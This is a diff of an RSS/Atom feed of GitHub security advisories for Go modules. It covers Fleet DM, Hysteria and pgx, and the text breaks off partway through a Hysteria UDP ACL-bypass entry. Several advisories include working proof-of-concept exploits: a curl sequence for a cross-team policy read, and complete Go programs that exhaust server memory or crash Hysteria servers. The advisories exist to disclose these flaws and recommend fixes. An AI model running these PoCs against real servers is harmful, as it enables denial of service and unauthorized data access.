@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-06-26T19:30:17.092Z</updated>
+    <updated>2026-06-26T20:30:44.655Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,762 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/fleetdm/fleet/v4] Fleet DM Vulnerable to Cross-Team Policy Data Exposure via Global Policy Read Endpoint]]></title>
+        <id>https://github.com/advisories/GHSA-gm7f-v959-fr2g</id>
+        <link href="https://github.com/advisories/GHSA-gm7f-v959-fr2g"/>
+        <updated>2026-06-26T20:30:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The global policy read endpoint (<code>GET /api/latest/fleet/policies/{policy_id}</code>) performs authorization against an empty <code>fleet.Policy{}</code> struct with nil TeamID, then fetches any policy by ID from the database without verifying the fetched policy actually belongs to the global scope. This allows a user with observer-level access on any single team to read the full details of policies belonging to any other team, bypassing Fleet's team isolation model.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerability is in <code>GetPolicyByIDQueries</code> at <code>server/service/global_policies.go:163-180</code>:</p>
+<pre><code class="language-go">func (svc Service) GetPolicyByIDQueries(ctx context.Context, policyID uint) (*fleet.Policy, error) {
+    // Auth check uses empty Policy{} — TeamID is nil
+    if err := svc.authz.Authorize(ctx, &amp;fleet.Policy{}, fleet.ActionRead); err != nil {
+        return nil, err
+    }
+
+    // Fetches ANY policy by ID, regardless of team ownership
+    policy, err := svc.ds.Policy(ctx, policyID)
+    if err != nil {
+        return nil, err
+    }
+    // ... populates install_software and run_script, returns full policy
+    return policy, nil
+}
+</code></pre>
+<p>The authorization passes because the OPA rule at <code>server/authz/policy.rego:724-728</code> allows reading policies with null <code>team_id</code> for any user who holds a role on any team:</p>
+<pre><code class="language-rego">allow {
+  is_null(object.team_id)
+  object.type == "policy"
+  team_role(subject, subject.teams[_].id) == [admin, maintainer, technician, observer, observer_plus][_]
+  action == read
+}
+</code></pre>
+<p>Since the auth object has nil TeamID, this rule fires for any team member. After authorization, <code>ds.Policy()</code> calls <code>policyDB()</code> at <code>server/datastore/mysql/policies.go:283-288</code> with a nil teamID:</p>
+<pre><code class="language-go">func policyDB(ctx context.Context, q sqlx.QueryerContext, id uint, teamID *uint) (*fleet.Policy, error) {
+    teamWhere := "TRUE"  // nil teamID → no team filter
+    args := []interface{}{id}
+    if teamID != nil {
+        teamWhere = "team_id = ?"
+        args = append(args, *teamID)
+    }
+    // ... executes SELECT with WHERE p.id = ? AND {teamWhere}
+</code></pre>
+<p>This returns any policy regardless of team ownership, and the full policy object is returned to the caller without any post-fetch team verification.</p>
+<p>By contrast, the properly-secured endpoints verify team scope:</p>
+<ul>
+<li><code>GetTeamPolicyByIDQueries</code> (<code>team_policies.go:421-428</code>) sets <code>TeamID: ptr.Uint(teamID)</code> on the auth object and calls <code>ds.TeamPolicy()</code> which filters by team</li>
+<li><code>DeleteGlobalPolicies</code> (<code>global_policies.go:255-263</code>) explicitly checks <code>policy.PolicyData.TeamID != nil</code> after fetching</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<p>Prerequisites: A Fleet instance with at least two teams. User A has observer role on Team 1 only. Team 2 has policies that User A should not be able to view.</p>
+<pre><code class="language-bash"># Step 1: Authenticate as User A (Team 1 observer only)
+TOKEN=$(curl -s -X POST https://fleet.example.com/api/latest/fleet/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"team1observer@example.com","password":"password"}' | jq -r '.token')
+
+# Step 2: Enumerate policy IDs (they are sequential integers)
+# Attempt to read a policy belonging to Team 2 (e.g., policy ID 5)
+curl -s -H "Authorization: Bearer $TOKEN" \
+  https://fleet.example.com/api/latest/fleet/policies/5
+
+# Expected: 403 Forbidden (user has no access to Team 2)
+# Actual: 200 OK with full policy data:
+# {
+#   "policy": {
+#     "id": 5,
+#     "name": "Team 2 Sensitive Policy",
+#     "query": "SELECT * FROM sensitive_table WHERE ...",
+#     "team_id": 2,
+#     "passing_host_count": 42,
+#     "failing_host_count": 7,
+#     "description": "...",
+#     "resolution": "...",
+#     ...
+#   }
+# }
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An authenticated user with observer-level access on any single team can:</p>
+<ul>
+<li><strong>Read SQL queries</strong> from all team policies across the Fleet instance, potentially revealing security monitoring strategies, compliance checks, and internal infrastructure details</li>
+<li><strong>View host pass/fail counts</strong> for other teams' policies, leaking compliance posture data across team boundaries</li>
+<li><strong>Access software installer and script metadata</strong> associated with other teams' policies via the <code>populatePolicyInstallSoftware</code> and <code>populatePolicyRunScript</code> calls</li>
+<li><strong>Enumerate all policies</strong> by iterating sequential integer IDs</li>
+</ul>
+<p>This breaks Fleet's team isolation model, which is designed to restrict visibility between teams. Organizations using teams to separate departments, clients, or security zones would have their policy data exposed across boundaries.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Add a post-fetch check in <code>GetPolicyByIDQueries</code> to verify the returned policy is actually a global policy (nil TeamID), consistent with how <code>DeleteGlobalPolicies</code> operates:</p>
+<pre><code class="language-go">func (svc Service) GetPolicyByIDQueries(ctx context.Context, policyID uint) (*fleet.Policy, error) {
+    if err := svc.authz.Authorize(ctx, &amp;fleet.Policy{}, fleet.ActionRead); err != nil {
+        return nil, err
+    }
+
+    policy, err := svc.ds.Policy(ctx, policyID)
+    if err != nil {
+        return nil, err
+    }
+
+    // Verify this is actually a global policy — team policies must be
+    // accessed via the team-scoped endpoint which enforces team authorization
+    if policy.TeamID != nil {
+        return nil, authz.ForbiddenWithInternal(
+            "attempting to read team policy via global endpoint",
+            authz.UserFromContext(ctx),
+            policy,
+            fleet.ActionRead,
+        )
+    }
+
+    if err := svc.populatePolicyInstallSoftware(ctx, policy); err != nil {
+        return nil, ctxerr.Wrap(ctx, err, "populate install_software")
+    }
+    if err := svc.populatePolicyRunScript(ctx, policy); err != nil {
+        return nil, ctxerr.Wrap(ctx, err, "populate run_script")
+    }
+
+    return policy, nil
+}
+</code></pre>
+<p>Alternatively, re-authorize against the actual fetched policy object so OPA rules properly evaluate team membership, similar to how other Fleet endpoints handle object-level authorization.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/fleetdm/fleet/security/advisories/GHSA-gm7f-v959-fr2g">https://github.com/fleetdm/fleet/security/advisories/GHSA-gm7f-v959-fr2g</a></li>
+<li><a href="https://github.com/advisories/GHSA-gm7f-v959-fr2g">https://github.com/advisories/GHSA-gm7f-v959-fr2g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gm7f-v959-fr2g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-26T20:30:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/apernet/hysteria] Hysteria: http large header with sniff cause server DoS]]></title>
+        <id>https://github.com/advisories/GHSA-jqc5-2p7q-fqfc</id>
+        <link href="https://github.com/advisories/GHSA-jqc5-2p7q-fqfc"/>
+        <updated>2026-06-26T20:19:02.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Sending an excessively large header by an attacker could lead to a server-side DoS attack.</p>
+<h3 id="details">Details</h3>
+<p>The current sniff implementation does not explicitly specify the upper limit for HTTP headers. Attackers can continuously send excessively large headers without including \r\n\r\n, leading to ServerDoS and OutOfMemory errors.</p>
+<h3 id="poc">PoC</h3>
+<p>server.yaml</p>
+<pre><code>listen: 127.0.0.1:8443
+
+tls:
+  cert: poc_server.crt
+  key: poc_server.key
+
+auth:
+  type: password
+  password: sniff-poc-password
+
+sniff:
+  enable: true
+  timeout: 10s
+  rewriteDomain: false
+  tcpPorts: 80
+
+masquerade:
+  type: string
+  string:
+    content: nope
+    statusCode: 404
+</code></pre>
+<p>poc.sh</p>
+<pre><code>#!/bin/bash
+go build poc_sniff_http_dos.go
+./poc_sniff_http_dos \
+    --server 127.0.0.1:8443 \
+    --auth sniff-poc-password \
+    --insecure \
+    --target-host 192.0.2.1 \
+    --target-port 80 \
+    --connections 16 \
+    --header-bytes 838860800 \
+    --linger 12
+</code></pre>
+<p>poc.go</p>
+<pre><code>//go:build poc
+
+package main
+
+import (
+    "crypto/sha256"
+    "crypto/x509"
+    "encoding/hex"
+    "errors"
+    "flag"
+    "fmt"
+    "net"
+    "strings"
+    "sync"
+    "time"
+
+    coreclient "github.com/apernet/hysteria/core/v2/client"
+    "github.com/apernet/hysteria/extras/v2/obfs"
+)
+
+type attackConnFactory struct {
+    obfuscator obfs.Obfuscator
+}
+
+func (f *attackConnFactory) New(_ net.Addr) (net.PacketConn, error) {
+    conn, err := net.ListenUDP("udp", nil)
+    if err != nil {
+        return nil, err
+    }
+    if f.obfuscator == nil {
+        return conn, nil
+    }
+    return obfs.WrapPacketConn(conn, f.obfuscator), nil
+}
+
+func buildHeaderPayload(totalBytes, chunkSize int) []byte {
+    prefix := []byte("GET / HTTP/1.1\r\nHost: victim\r\nUser-Agent: hy2-sniff-poc\r\n")
+    if totalBytes &lt;= len(prefix) {
+        return prefix[:totalBytes]
+    }
+    out := make([]byte, 0, totalBytes)
+    out = append(out, prefix...)
+    linePayload := chunkSize - 32
+    if linePayload &lt; 64 {
+        linePayload = 64
+    }
+    for i := 0; len(out) &lt; totalBytes; i++ {
+        line := fmt.Sprintf("X-Fill-%06d: %s\r\n", i, strings.Repeat("A", linePayload))
+        remain := totalBytes - len(out)
+        if len(line) &gt; remain {
+            line = line[:remain]
+        }
+        out = append(out, line...)
+    }
+    // 故意不追加最后一个空行 \r\n，迫使服务端在 sniff timeout 内持续读 header。
+    return out
+}
+
+func makeClient(server, auth, sni string, insecure bool, pinSHA256, salamanderPSK string) (coreclient.Client, error) {
+    serverAddr, err := net.ResolveUDPAddr("udp", server)
+    if err != nil {
+        return nil, err
+    }
+    cfg := &amp;coreclient.Config{
+        ConnFactory: &amp;attackConnFactory{},
+        ServerAddr:  serverAddr,
+        Auth:        auth,
+        TLSConfig: coreclient.TLSConfig{
+            InsecureSkipVerify: insecure,
+        },
+    }
+    host, _, err := net.SplitHostPort(server)
+    if err == nil &amp;&amp; sni == "" &amp;&amp; net.ParseIP(host) == nil {
+        cfg.TLSConfig.ServerName = host
+    }
+    if sni != "" {
+        cfg.TLSConfig.ServerName = sni
+    }
+    if pinSHA256 != "" {
+        nHash := strings.ToLower(strings.ReplaceAll(pinSHA256, ":", ""))
+        cfg.TLSConfig.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
+            if len(rawCerts) == 0 {
+                return errors.New("no peer certificate")
+            }
+            h := sha256.Sum256(rawCerts[0])
+            if hex.EncodeToString(h[:]) == nHash {
+                return nil
+            }
+            return errors.New("no certificate matches the pinned hash")
+        }
+    }
+    if salamanderPSK != "" {
+        ob, err := obfs.NewSalamanderObfuscator([]byte(salamanderPSK))
+        if err != nil {
+            return nil, err
+        }
+        cfg.ConnFactory = &amp;attackConnFactory{obfuscator: ob}
+    }
+    c, _, err := coreclient.NewClient(cfg)
+    return c, err
+}
+
+func worker(id int, c coreclient.Client, target string, payload []byte, sendChunk int, linger time.Duration, results []string) {
+    conn, err := c.TCP(target)
+    if err != nil {
+        results[id] = fmt.Sprintf("worker=%d dial error=%v", id, err)
+        return
+    }
+    defer conn.Close()
+    _ = conn.SetWriteDeadline(time.Now().Add(linger))
+    sent := 0
+    for sent &lt; len(payload) {
+        end := sent + sendChunk
+        if end &gt; len(payload) {
+            end = len(payload)
+        }
+        n, err := conn.Write(payload[sent:end])
+        if err != nil {
+            results[id] = fmt.Sprintf("worker=%d partial_sent=%d error=%v", id, sent, err)
+            return
+        }
+        sent += n
+    }
+    time.Sleep(linger)
+    results[id] = fmt.Sprintf("worker=%d sent=%d", id, sent)
+}
+
+func main() {
+    server := flag.String("server", "", "Hysteria server address, e.g. 1.2.3.4:443")
+    auth := flag.String("auth", "", "Hysteria auth string/password")
+    sni := flag.String("sni", "", "optional TLS SNI")
+    insecure := flag.Bool("insecure", false, "skip TLS verification")
+    pinSHA256 := flag.String("pin-sha256", "", "optional pinned server cert SHA256")
+    salamanderPSK := flag.String("obfs-salamander-password", "", "optional salamander obfs password")
+    targetHost := flag.String("target-host", "192.0.2.1", "must usually be an IP so sniff.Check() runs when rewriteDomain=false")
+    targetPort := flag.Int("target-port", 80, "target port that should be covered by server sniff.tcpPorts")
+    connections := flag.Int("connections", 16, "number of concurrent Hysteria TCP streams")
+    headerBytes := flag.Int("header-bytes", 8*1024*1024, "bytes of incomplete HTTP header per stream")
+    buildChunk := flag.Int("build-chunk", 8192, "approximate size of generated filler header lines")
+    sendChunk := flag.Int("send-chunk", 64*1024, "bytes written per conn.Write call")
+    lingerSec := flag.Float64("linger", 12, "seconds to keep each stream open after writing")
+    flag.Parse()
+
+    if *server == "" || *auth == "" {
+        panic("--server and --auth are required")
+    }
+    if !*insecure &amp;&amp; *pinSHA256 == "" {
+        panic("provide one of: --insecure / --pin-sha256")
+    }
+
+    payload := buildHeaderPayload(*headerBytes, *buildChunk)
+    target := net.JoinHostPort(*targetHost, fmt.Sprintf("%d", *targetPort))
+    linger := time.Duration(*lingerSec * float64(time.Second))
+
+    fmt.Printf("[*] server=%s target=%s streams=%d payload=%d\n", *server, target, *connections, len(payload))
+
+    c, err := makeClient(*server, *auth, *sni, *insecure, *pinSHA256, *salamanderPSK)
+    if err != nil {
+        panic(err)
+    }
+    defer c.Close()
+
+    results := make([]string, *connections)
+    var wg sync.WaitGroup
+    start := time.Now()
+    for i := 0; i &lt; *connections; i++ {
+        wg.Add(1)
+        go func(i int) {
+            defer wg.Done()
+            worker(i, c, target, payload, *sendChunk, linger, results)
+        }(i)
+    }
+
+    wg.Wait()
+    fmt.Printf("[*] elapsed=%s\n", time.Since(start).Round(time.Millisecond))
+    for _, line := range results {
+        fmt.Printf("    %s\n", line)
+    }
+    fmt.Println("[+] sent incomplete oversized HTTP headers; check server-side memory / stability")
+}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Testing showed that the server side used a maximum of 16GB.</p>
+<p>Server memory DoS and may cause OOM.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/apernet/hysteria/security/advisories/GHSA-jqc5-2p7q-fqfc">https://github.com/apernet/hysteria/security/advisories/GHSA-jqc5-2p7q-fqfc</a></li>
+<li><a href="https://github.com/advisories/GHSA-jqc5-2p7q-fqfc">https://github.com/advisories/GHSA-jqc5-2p7q-fqfc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jqc5-2p7q-fqfc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-26T20:19:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/jackc/pgx/v5] pgx contains memory-safety vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-xgrm-4fwx-7qm8</id>
+        <link href="https://github.com/advisories/GHSA-xgrm-4fwx-7qm8"/>
+        <updated>2026-06-26T20:04:59.000Z</updated>
+        <content type="html"><![CDATA[<p><a href="github.com/jackc/pgx/v5">pgx</a> is a pure Go driver and toolkit for PostgreSQL. pgx prior to v5.9.0 contains a memory-safety vulnerability.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33815">https://nvd.nist.gov/vuln/detail/CVE-2026-33815</a></li>
+<li><a href="https://pkg.go.dev/vuln/GO-2026-4771">https://pkg.go.dev/vuln/GO-2026-4771</a></li>
+<li><a href="https://github.com/jackc/pgx/issues/2519">https://github.com/jackc/pgx/issues/2519</a></li>
+<li><a href="https://github.com/jackc/pgx/issues/2530">https://github.com/jackc/pgx/issues/2530</a></li>
+<li><a href="https://github.com/jackc/pgx/commit/6dbad4cafdb8a4daab7ff79c858c95da4b6109e8">https://github.com/jackc/pgx/commit/6dbad4cafdb8a4daab7ff79c858c95da4b6109e8</a></li>
+<li><a href="https://github.com/advisories/GHSA-xgrm-4fwx-7qm8">https://github.com/advisories/GHSA-xgrm-4fwx-7qm8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xgrm-4fwx-7qm8</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-07T18:31:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/apernet/hysteria] Hysteria vulnerable to server crash when max_datagram_frame_size very small]]></title>
+        <id>https://github.com/advisories/GHSA-qh5x-rfwf-rvfv</id>
+        <link href="https://github.com/advisories/GHSA-qh5x-rfwf-rvfv"/>
+        <updated>2026-06-26T19:58:13.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An authenticated client can crash the Hysteria server by advertising a very small QUIC <code>max_datagram_frame_size</code> and then triggering a UDP response from the server. When the server tries to send the UDP response back via QUIC DATAGRAM, quic-go returns <code>DatagramTooLargeError</code>. The server then attempts to fragment the Hysteria UDP message, but the fragmentation code does not handle the case where the UDP message header itself is larger than the maximum datagram payload size. This results in a slice bounds panic and terminates the server process.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerable path is the normal server-side UDP response path:</p>
+<pre><code class="language-text">udpSessionEntry.receiveLoop
+  -&gt; sendMessageAutoFrag
+    -&gt; frag.FragUDPMessage
+</code></pre>
+<p>In <code>core/server/udp.go</code>, <code>receiveLoop</code> packages a UDP response into a <code>protocol.UDPMessage</code> and calls <code>sendMessageAutoFrag</code>. If <code>SendDatagram</code> fails with <code>quic.DatagramTooLargeError</code>, <code>sendMessageAutoFrag</code> calls:</p>
+<pre><code class="language-go">fMsgs := frag.FragUDPMessage(msg, int(errTooLarge.MaxDatagramPayloadSize))
+</code></pre>
+<p>However, <code>FragUDPMessage</code> in <code>core/internal/frag/frag.go</code> assumes that <code>maxSize</code> is greater than the UDP message header size:</p>
+<pre><code class="language-go">maxPayloadSize := maxSize - m.HeaderSize()
+</code></pre>
+<p>If an attacker-controlled client advertises a small enough <code>max_datagram_frame_size</code>, <code>errTooLarge.MaxDatagramPayloadSize</code> can be smaller than <code>m.HeaderSize()</code>. In that case, <code>maxPayloadSize</code> becomes zero or negative, and the later slicing operation panics:</p>
+<pre><code class="language-go">frag.Data = fullPayload[off : off+payloadSize]
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>poc.yaml</p>
+<pre><code class="language-yaml">listen: 127.0.0.1:8443
+
+tls:
+  cert: poc_server.crt
+  key: poc_server.key
+
+auth:
+  type: password
+  password: udp-frag-panic-poc
+
+
+masquerade:
+  type: string
+  string:
+    content: nope
+    statusCode: 404
+</code></pre>
+<p>poc.go</p>
+<pre><code class="language-go">//go:build poc
+
+package main
+
+import (
+    "bytes"
+    "context"
+    "crypto/tls"
+    "encoding/binary"
+    "flag"
+    "fmt"
+    "io"
+    "net"
+    "net/http"
+    "net/url"
+    "time"
+
+    "github.com/apernet/quic-go"
+    "github.com/apernet/quic-go/http3"
+    "github.com/apernet/quic-go/quicvarint"
+)
+
+const (
+    authHost = "hysteria"
+    authPath = "/auth"
+    authOK   = 233
+)
+
+func main() {
+    server := flag.String("server", "127.0.0.1:8443", "Hysteria server address")
+    auth := flag.String("auth", "", "Hysteria auth/password")
+    target := flag.String("target", "127.0.0.1:19090", "UDP target reachable from the server")
+    maxDatagram := flag.Int64("max-datagram", 20, "QUIC max_datagram_frame_size advertised by this client")
+    insecure := flag.Bool("insecure", true, "skip TLS verification")
+    echo := flag.Bool("echo", true, "start a local UDP echo server on --target")
+    flag.Parse()
+
+    if *auth == "" {
+        panic("--auth is required")
+    }
+    if *echo {
+        closeEcho := startUDPEcho(*target)
+        defer closeEcho()
+    }
+
+    conn, cleanup := dialAndAuth(*server, *auth, *insecure, *maxDatagram)
+    defer cleanup()
+
+    msg := hysteriaUDPMessage(1, *target, []byte("X"))
+    fmt.Printf("[*] authenticated, target=%s, headerSize=%d, datagramSize=%d, advertisedMaxDatagram=%d\n",
+        *target, udpHeaderSize(*target), len(msg), *maxDatagram)
+
+    if err := conn.SendDatagram(msg); err != nil {
+        panic(fmt.Errorf("send trigger datagram: %w", err))
+    }
+    fmt.Println("[+] trigger sent; vulnerable server should panic in frag.FragUDPMessage")
+
+    ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+    defer cancel()
+    if _, err := conn.ReceiveDatagram(ctx); err != nil {
+        fmt.Printf("[*] receive after trigger: %v\n", err)
+    } else {
+        fmt.Println("[!] received a response; try a smaller --max-datagram")
+    }
+}
+
+func dialAndAuth(server, auth string, insecure bool, maxDatagram int64) (*quic.Conn, func()) {
+    serverAddr, err := net.ResolveUDPAddr("udp", server)
+    if err != nil {
+        panic(err)
+    }
+    udpConn, err := net.ListenUDP("udp", nil)
+    if err != nil {
+        panic(err)
+    }
+
+    transport := &amp;quic.Transport{Conn: udpConn}
+    var qconn *quic.Conn
+    rt := &amp;http3.Transport{
+        TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: insecure},
+        QUICConfig: &amp;quic.Config{
+            EnableDatagrams:      true,
+            MaxDatagramFrameSize: maxDatagram,
+            DisablePathManager:   true,
+        },
+        Dial: func(ctx context.Context, _ string, tlsCfg *tls.Config, cfg *quic.Config) (*quic.Conn, error) {
+            qconn, err = transport.DialEarly(ctx, serverAddr, tlsCfg, cfg)
+            return qconn, err
+        },
+    }
+
+    req := &amp;http.Request{
+        Method: http.MethodPost,
+        Host:   authHost,
+        URL:    &amp;url.URL{Scheme: "https", Host: authHost, Path: authPath},
+        Header: http.Header{},
+        Body:   io.NopCloser(bytes.NewReader(nil)),
+    }
+    req.Header.Set("Hysteria-Auth", auth)
+    req.Header.Set("Hysteria-CC-RX", "0")
+
+    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+    defer cancel()
+    resp, err := rt.RoundTrip(req.WithContext(ctx))
+    if err != nil {
+        panic(err)
+    }
+    defer resp.Body.Close()
+    if resp.StatusCode != authOK {
+        panic(fmt.Errorf("auth failed: HTTP status %d", resp.StatusCode))
+    }
+    if resp.Header.Get("Hysteria-UDP") == "false" {
+        panic("server reports UDP disabled")
+    }
+
+    cleanup := func() {
+        _ = rt.Close()
+        _ = transport.Close()
+        _ = udpConn.Close()
+        if qconn != nil {
+            _ = qconn.CloseWithError(0, "")
+        }
+    }
+    return qconn, cleanup
+}
+
+func hysteriaUDPMessage(sessionID uint32, addr string, data []byte) []byte {
+    buf := make([]byte, udpHeaderSize(addr)+len(data))
+    binary.BigEndian.PutUint32(buf[0:4], sessionID)
+    // PacketID=0, FragID=0, FragCount=1.
+    buf[7] = 1
+    i := len(quicvarint.Append(buf[:8], uint64(len(addr))))
+    i += copy(buf[i:], addr)
+    copy(buf[i:], data)
+    return buf
+}
+
+func udpHeaderSize(addr string) int {
+    return 8 + quicvarint.Len(uint64(len(addr))) + len(addr)
+}
+
+func startUDPEcho(addr string) func() {
+    pc, err := net.ListenPacket("udp", addr)
+    if err != nil {
+        panic(fmt.Errorf("start UDP echo on %s: %w", addr, err))
+    }
+    fmt.Printf("[*] UDP echo listening on %s\n", pc.LocalAddr())
+
+    go func() {
+        buf := make([]byte, 2048)
+        for {
+            n, raddr, err := pc.ReadFrom(buf)
+            if err != nil {
+                return
+            }
+            _, _ = pc.WriteTo(buf[:n], raddr)
+        }
+    }()
+    return func() { _ = pc.Close() }
+}
+</code></pre>
+<p>poc.sh</p>
+<pre><code class="language-bash">go run -tags poc ./poc_udp_frag_panic.go \
+  --server 127.0.0.1:8443 \
+  --auth udp-frag-panic-poc \
+  --insecure \
+  --target 127.0.0.1:19090 \
+  --max-datagram 20
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Server crash</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/apernet/hysteria/security/advisories/GHSA-qh5x-rfwf-rvfv">https://github.com/apernet/hysteria/security/advisories/GHSA-qh5x-rfwf-rvfv</a></li>
+<li><a href="https://github.com/advisories/GHSA-qh5x-rfwf-rvfv">https://github.com/advisories/GHSA-qh5x-rfwf-rvfv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qh5x-rfwf-rvfv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-26T19:58:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/apernet/hysteria/core/v2] Hysteria has an authenticated UDP ACL bypass that enables localhost and private-network UDP SSRF]]></title>
+        <id>https://github.com/advisories/GHSA-vgrc-hq28-p3xp</id>
+        <link href="https://github.com/advisories/GHSA-vgrc-hq28-p3xp"/>
+        <updated>2026-06-26T19:48:52.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Hysteria's UDP relay treats the destination address as packet-scoped, but ACL and outbound policy are applied only once when a new UDP session is created. After an authenticated client opens a UDP session using an allowed first destination, later packets in the same <code>Session ID</code> can be sent to different destinations without re-running ACL evaluation.</p>
+<p>This allows an authenticated user to bypass server-side UDP ACL rules and reach localhost or RFC1918/private-network UDP services from the server's network perspective, even when those destinations are explicitly rejected by ACL.</p>
+<p>Verified on current HEAD at commit <code>64c396385631579598cc29d5561bff98c439772f</code>.</p>
+<h2 id="why-this-is-a-security-issue">Why this is a security issue</h2>
+<p>This report is not based on the assumption that one UDP session must be bound to one destination. The protocol and official client both support per-packet destinations:</p>
+<ul>
+<li><code>PROTOCOL.md:93-107</code> defines each <code>UDPMessage</code> as carrying its own <code>Addr</code> field.</li>
+<li><code>core/client/udp.go:52-62</code> exposes <code>Send(data, addr)</code>, allowing the same UDP session to send to arbitrary addresses.</li>
+</ul>
+<p>The problem is that the security-relevant destination is packet-scoped, while ACL and outbound authorization are cached at session scope.</p>
+<p>This is also not a <code>RequestHook</code>-bypass claim. I understand <code>RequestHook</code> is first-packet-oriented. The broader issue is that operator-configured ACL policy intended to block UDP destinations is not enforced on later packets within the same session.</p>
+<p>Because the ACL documentation is presented as the mechanism for handling or blocking client requests, and includes examples of denying <code>udp/443</code> and private network CIDRs, operators can reasonably rely on ACL as a UDP egress security boundary. This boundary can currently be bypassed by reusing a previously authorized UDP session.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>The relevant flow appears to be:</p>
+<ul>
+<li><code>core/server/udp.go:280-299</code>: when a new session is created, the first destination is passed through <code>m.io.Hook(...)</code>, logged, and then <code>m.io.UDP(addr)</code> is called once to create the outbound UDP connection.</li>
+<li><code>core/server/server.go:397-398</code>: <code>m.io.UDP(addr)</code> delegates to <code>io.Outbound.UDP(reqAddr)</code>.</li>
+<li><code>app/cmd/server.go:1187-1190</code>: resolver, ACL, and actual outbounds are intentionally chained through the <code>Outbound</code> interface.</li>
+<li><code>core/server/udp.go:125</code>: the initial outbound connection is created only from the first packet via <code>DialFunc(firstMsg.Addr, firstMsg.Data)</code>.</li>
+<li><code>core/server/udp.go:92-111</code>: later packets in the same session take the current packet address and directly call <code>e.conn.WriteTo(dfMsg.Data, addr)</code> without re-running ACL or outbound policy evaluation.</li>
+</ul>
+<p>In other words, destination selection is packet-scoped, but authorization is session-scoped.</p>
+<h2 id="impact">Impact</h2>
+<p>Any authenticated client that is allowed to use UDP relay can:</p>
+<ul>
+<li>open one UDP session using an allowed first destination;</li>
+<li>reuse the same session to send packets to destinations that ACL should reject;</li>
+<li>reach UDP services on <code>127.0.0.1</code> or on RFC1918/private-network addresses from the server's network perspective.</li>
+</ul>
+<p>In real deployments, this can expose internal-only UDP services such as:</p>
+<ul>
+<li>internal DNS resolvers;</li>
+<li>service discovery endpoints;</li>
+<li>telemetry or metrics listeners;</li>
+<li>local administrative daemons;</li>
+<li>application-specific UDP services intended to be reachable only from localhost or the internal network.</li>
+</ul>
+<p>This breaks the server's documented ACL-based UDP egress restrictions.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>Two cases were reproduced with integration tests.</p>
+<h3 id="case-1-localhost-bypass">Case 1: localhost bypass</h3>
+<p>ACL:</p>
+<pre><code class="language-text">direct(127.0.0.1, udp/&lt;allowedPort&gt;)
+reject(127.0.0.1/32)
+</code></pre>
+<p>Steps:</p>
+<ol>
+<li>Start one UDP echo service on <code>127.0.0.1:&lt;allowedPort&gt;</code>.</li>
+<li>Start another UDP echo service on <code>127.0.0.1:&lt;blockedPort&gt;</code>.</li>
+<li>Connect an authenticated Hysteria client and create one UDP session.</li>
+<li>Send a packet to the allowed loopback destination to establish the session.</li>
+<li>Reuse the same UDP session and send a packet to the blocked loopback destination.</li>
+</ol>
+<p>Observed result:</p>
+<ul>
+<li>The second packet is relayed successfully and the blocked loopback service replies.</li>
+</ul>
+<p>Expected result:</p>
+<ul>
+<li>The second packet should be rejected because <code>127.0.0.1/32</code> is denied by ACL.</li>
+</ul>
+<h3 id="case-2-private-network-bypass">Case 2: private-network bypass</h3>
+<p>ACL:</p>
+<pre><code class="language-text">direct(127.0.0.1, udp/&lt;allowedPort&gt;)
+reject(10.0.0.0/8)
+</code></pre>
+<p>or the corresponding local RFC1918 range, such as <code>192.168.0.0/16</code> or <code>172.16.0.0/12</code>.</p>
